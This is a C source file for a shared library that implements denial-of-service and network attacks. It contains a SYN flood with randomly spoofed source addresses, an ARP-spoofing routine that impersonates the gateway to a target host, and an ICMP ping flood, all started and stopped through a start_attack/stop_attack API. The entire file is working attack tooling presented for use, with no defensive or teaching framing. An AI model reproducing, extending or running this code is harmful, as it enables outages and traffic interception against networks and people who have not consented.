/*
 * dos_core.c - SYN flood, ARP spoof, Ping flood (with interface validation)
 * Compile: gcc -O2 -shared -fPIC -o libdos.so dos_core.c -lpthread
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/if_ether.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <netpacket/packet.h>
#include <sys/ioctl.h>

typedef struct { volatile int stop; pthread_t tid; } thread_ctrl_t;

typedef struct {
    char *attack_type;
    char *target;
    char *source_ip;
    char *gateway_ip;
    int   num_packets;
    char *iface;
} AttackConfig;

unsigned short in_cksum(unsigned short *addr, int len) {
    int nleft = len, sum = 0;
    unsigned short *w = addr, answer = 0;
    while (nleft > 1) { sum += *w++; nleft -= 2; }
    if (nleft == 1) { *(unsigned char *)(&answer) = *(unsigned char *)w; sum += answer; }
    sum = (sum >> 16) + (sum & 0xffff); sum += (sum >> 16);
    return (unsigned short)(~sum);
}

/* ----- SYN Flood data ----- */
typedef struct {
    thread_ctrl_t ctrl;
    int sock;
    char iface[IF_NAMESIZE];
    unsigned char src_mac[6];
    struct sockaddr_ll dest_addr;
    char target_ip[INET_ADDRSTRLEN];
    int target_port;
    char source_ip[INET_ADDRSTRLEN];
    int packet_count;
} syn_data_t;

struct eth_ip_tcp_packet {
    struct ether_header eth;
    struct iphdr        ip;
    struct tcphdr       tcp;
} __attribute__((packed));

void *syn_flood_thread(void *arg) {
    syn_data_t *d = (syn_data_t *)arg;
    struct eth_ip_tcp_packet pkt;
    memset(&pkt, 0, sizeof(pkt));
    int sent = 0;

    memcpy(pkt.eth.ether_shost, d->src_mac, 6);
    memset(pkt.eth.ether_dhost, 0xff, 6);
    pkt.eth.ether_type = htons(ETH_P_IP);

    struct iphdr *ip = &pkt.ip;
    ip->version = 4; ip->ihl = 5;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    ip->id = htons(random() % 65535); ip->ttl = 64; ip->protocol = IPPROTO_TCP;
    if (d->source_ip[0]) inet_pton(AF_INET, d->source_ip, &ip->saddr);
    else ip->saddr = htonl(random());
    inet_pton(AF_INET, d->target_ip, &ip->daddr);

    struct tcphdr *tcp = &pkt.tcp;
    tcp->source = htons(random() % 65535);
    tcp->dest = htons(d->target_port);
    tcp->seq = htonl(random());
    tcp->doff = 5; tcp->syn = 1; tcp->window = htons(65535);

    // TCP checksum
    struct { uint32_t saddr, daddr; uint8_t zero, protocol; uint16_t length; } pseudo;
    pseudo.saddr = ip->saddr; pseudo.daddr = ip->daddr; pseudo.zero = 0;
    pseudo.protocol = IPPROTO_TCP; pseudo.length = htons(sizeof(struct tcphdr));
    char pseudogram[sizeof(pseudo) + sizeof(struct tcphdr)];
    memcpy(pseudogram, &pseudo, sizeof(pseudo));
    memcpy(pseudogram + sizeof(pseudo), tcp, sizeof(struct tcphdr));
    tcp->check = in_cksum((unsigned short *)pseudogram, sizeof(pseudogram));
    ip->check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));

    while (!d->ctrl.stop) {
        if (!d->source_ip[0]) {
            ip->saddr = htonl(random());
            pseudo.saddr = ip->saddr;
            memcpy(pseudogram, &pseudo, sizeof(pseudo));
            memcpy(pseudogram + sizeof(pseudo), tcp, sizeof(struct tcphdr));
            tcp->check = in_cksum((unsigned short *)pseudogram, sizeof(pseudogram));
            ip->check = 0;
            ip->check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));
        }
        if (sendto(d->sock, &pkt, sizeof(pkt), 0,
                   (struct sockaddr *)&d->dest_addr, sizeof(d->dest_addr)) < 0) {
            if (errno != EAGAIN && errno != EWOULDBLOCK)
                fprintf(stderr, "SYN sendto error: %s\n", strerror(errno));
            continue;
        }
        if (d->packet_count > 0 && ++sent >= d->packet_count) break;
    }
    close(d->sock);
    return NULL;
}

/* ----- ARP Spoof data ----- */
typedef struct {
    thread_ctrl_t ctrl;
    int sock;
    char iface[IF_NAMESIZE];
    unsigned char src_mac[6];
    struct sockaddr_ll dest_addr;
    char target_ip[INET_ADDRSTRLEN];
    char gateway_ip[INET_ADDRSTRLEN];
    int packet_count;
} arp_data_t;

void *arp_spoof_thread(void *arg) {
    arp_data_t *d = (arp_data_t *)arg;
    unsigned char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
    struct ether_header *eth = (struct ether_header *)packet;
    struct ether_arp *arp = (struct ether_arp *)(packet + sizeof(struct ether_header));
    int sent = 0;

    memset(eth->ether_dhost, 0xff, 6);
    memcpy(eth->ether_shost, d->src_mac, 6);
    eth->ether_type = htons(ETHERTYPE_ARP);
    arp->arp_hrd = htons(ARPHRD_ETHER); arp->arp_pro = htons(ETHERTYPE_IP);
    arp->arp_hln = 6; arp->arp_pln = 4; arp->arp_op = htons(ARPOP_REPLY);
    memcpy(arp->arp_sha, d->src_mac, 6);
    inet_pton(AF_INET, d->gateway_ip, arp->arp_spa);
    memset(arp->arp_tha, 0xff, 6);
    inet_pton(AF_INET, d->target_ip, arp->arp_tpa);

    while (!d->ctrl.stop) {
        if (sendto(d->sock, packet, sizeof(packet), 0,
                   (struct sockaddr *)&d->dest_addr, sizeof(d->dest_addr)) < 0)
            fprintf(stderr, "ARP sendto error: %s\n", strerror(errno));
        if (d->packet_count > 0 && ++sent >= d->packet_count) break;
        usleep(500000);
    }
    close(d->sock);
    return NULL;
}

/* ----- Ping Flood data ----- */
typedef struct {
    thread_ctrl_t ctrl;
    int sock;
    char target_ip[INET_ADDRSTRLEN];
    int packet_count;
} ping_data_t;

struct icmp_hdr { uint8_t type, code; uint16_t checksum, id, seq; };

void *ping_flood_thread(void *arg) {
    ping_data_t *d = (ping_data_t *)arg;
    char packet[sizeof(struct icmp_hdr) + 56];
    struct icmp_hdr *icmp = (struct icmp_hdr *)packet;
    struct sockaddr_in sin;
    int sent = 0;

    memset(packet, 0, sizeof(packet));
    icmp->type = 8; icmp->code = 0;
    icmp->id = htons(getpid() & 0xFFFF); icmp->seq = htons(1);
    memset(packet + sizeof(struct icmp_hdr), 'A', 56);
    icmp->checksum = in_cksum((unsigned short *)packet, sizeof(packet));
    sin.sin_family = AF_INET;
    inet_pton(AF_INET, d->target_ip, &sin.sin_addr);

    while (!d->ctrl.stop) {
        if (sendto(d->sock, packet, sizeof(packet), 0,
                   (struct sockaddr *)&sin, sizeof(sin)) < 0)
            fprintf(stderr, "ICMP sendto error: %s\n", strerror(errno));
        icmp->seq = htons(++sent);
        icmp->checksum = 0;
        icmp->checksum = in_cksum((unsigned short *)packet, sizeof(packet));
        if (d->packet_count > 0 && sent >= d->packet_count) break;
    }
    close(d->sock);
    return NULL;
}

/* ----- Interface validation ----- */
int validate_interface(const char *iface, unsigned char *mac_out, struct sockaddr_ll *dest_addr) {
    if (!iface) return 0;
    int idx = if_nametoindex(iface);
    if (idx == 0) {
        fprintf(stderr, "Interface '%s' not found\n", iface);
        return 0;
    }
    int tmp = socket(AF_INET, SOCK_DGRAM, 0);
    if (tmp < 0) return 0;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IF_NAMESIZE);
    if (ioctl(tmp, SIOCGIFHWADDR, &ifr) < 0) {
        close(tmp);
        fprintf(stderr, "Cannot get MAC for interface '%s'\n", iface);
        return 0;
    }
    memcpy(mac_out, ifr.ifr_hwaddr.sa_data, 6);
    close(tmp);

    memset(dest_addr, 0, sizeof(*dest_addr));
    dest_addr->sll_ifindex = idx;
    dest_addr->sll_halen = 6;
    memset(dest_addr->sll_addr, 0xff, 6);
    return 1;
}

/* ----- Attack handle API ----- */
typedef struct { void *internal_data; } AttackHandle;

AttackHandle *start_attack(const AttackConfig *cfg) {
    AttackHandle *handle = malloc(sizeof(AttackHandle));
    if (!handle) return NULL;

    if (strcmp(cfg->attack_type, "syn_flood") == 0) {
        syn_data_t *d = calloc(1, sizeof(syn_data_t));
        const char *iface = cfg->iface ? cfg->iface : "eth0";
        if (!validate_interface(iface, d->src_mac, &d->dest_addr)) {
            free(d); free(handle); return NULL;
        }
        strncpy(d->iface, iface, IF_NAMESIZE);
        strncpy(d->target_ip, cfg->target, INET_ADDRSTRLEN);
        d->target_port = 80;
        if (cfg->source_ip) strncpy(d->source_ip, cfg->source_ip, INET_ADDRSTRLEN);
        d->packet_count = cfg->num_packets;

        int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
        if (sock < 0) { free(d); free(handle); return NULL; }
        d->sock = sock;
        handle->internal_data = d;
        pthread_create(&d->ctrl.tid, NULL, syn_flood_thread, d);
    }
    else if (strcmp(cfg->attack_type, "arp_spoof") == 0) {
        if (!cfg->gateway_ip) { free(handle); return NULL; }
        arp_data_t *d = calloc(1, sizeof(arp_data_t));
        const char *iface = cfg->iface ? cfg->iface : "eth0";
        if (!validate_interface(iface, d->src_mac, &d->dest_addr)) {
            free(d); free(handle); return NULL;
        }
        strncpy(d->iface, iface, IF_NAMESIZE);
        strncpy(d->target_ip, cfg->target, INET_ADDRSTRLEN);
        strncpy(d->gateway_ip, cfg->gateway_ip, INET_ADDRSTRLEN);
        d->packet_count = cfg->num_packets;

        int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        if (sock < 0) { free(d); free(handle); return NULL; }
        d->sock = sock;
        handle->internal_data = d;
        pthread_create(&d->ctrl.tid, NULL, arp_spoof_thread, d);
    }
    else if (strcmp(cfg->attack_type, "ping_flood") == 0) {
        ping_data_t *d = calloc(1, sizeof(ping_data_t));
        strncpy(d->target_ip, cfg->target, INET_ADDRSTRLEN);
        d->packet_count = cfg->num_packets;
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (sock < 0) { free(d); free(handle); return NULL; }
        d->sock = sock;
        handle->internal_data = d;
        pthread_create(&d->ctrl.tid, NULL, ping_flood_thread, d);
    }
    else { free(handle); return NULL; }
    return handle;
}

void stop_attack(AttackHandle *handle) {
    if (!handle || !handle->internal_data) return;
    thread_ctrl_t *ctrl = (thread_ctrl_t *)handle->internal_data;
    ctrl->stop = 1;
    pthread_join(ctrl->tid, NULL);
    free(handle->internal_data);
    free(handle);
}